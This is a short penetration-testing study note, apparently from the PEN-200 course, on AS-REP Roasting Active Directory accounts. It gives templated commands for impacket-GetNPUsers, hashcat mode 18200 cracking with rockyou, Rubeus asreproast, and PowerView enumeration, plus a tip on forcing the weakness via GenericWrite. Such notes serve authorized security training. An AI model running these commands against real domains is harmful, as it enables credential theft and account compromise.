# 23.2.2 — AS-REP Roasting

- Module: PEN-200 · 23. Attacking Active Directory Authentication
- Source: portal.offsec.com · module `attacking-active-directory-authentication-46102` (§23.2.2)
- Code blocks: 5

> If an account has **"Do not require Kerberos preauthentication"** enabled, anyone can request an
> AS-REP for it and crack the encrypted portion **offline**. Hashcat mode **18200**. Output omitted.

## Kali — impacket-GetNPUsers

```bash
impacket-GetNPUsers -dc-ip {{DC_IP}} -request -outputfile {{HASHFILE}} {{DOMAIN}}/{{USERNAME}}
```

```bash
hashcat --help | grep -i "Kerberos"     # confirm: 18200 = Kerberos 5 AS-REP
sudo hashcat -m 18200 {{HASHFILE}} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Windows — Rubeus (as any authenticated domain user)

```powershell
.\Rubeus.exe asreproast /nowrap        # auto-finds vulnerable accounts; /nowrap = clean hash
```

## Just enumerate vulnerable users (no roast)

```powershell
Get-DomainUser -PreauthNotRequired      # PowerView (Windows)
```

```bash
impacket-GetNPUsers -dc-ip {{DC_IP}} {{DOMAIN}}/{{USERNAME}}    # Kali: omit -request/-outputfile
```

> **Targeted AS-REP Roasting:** with `GenericWrite`/`GenericAll` over a user, flip its UAC to not
> require preauth, roast it, then **reset the UAC value** afterward. See [[10-enumerating-object-permissions]]
> and the htbad ACL notes [[../htbad/21-acl-abuse-tactics]].
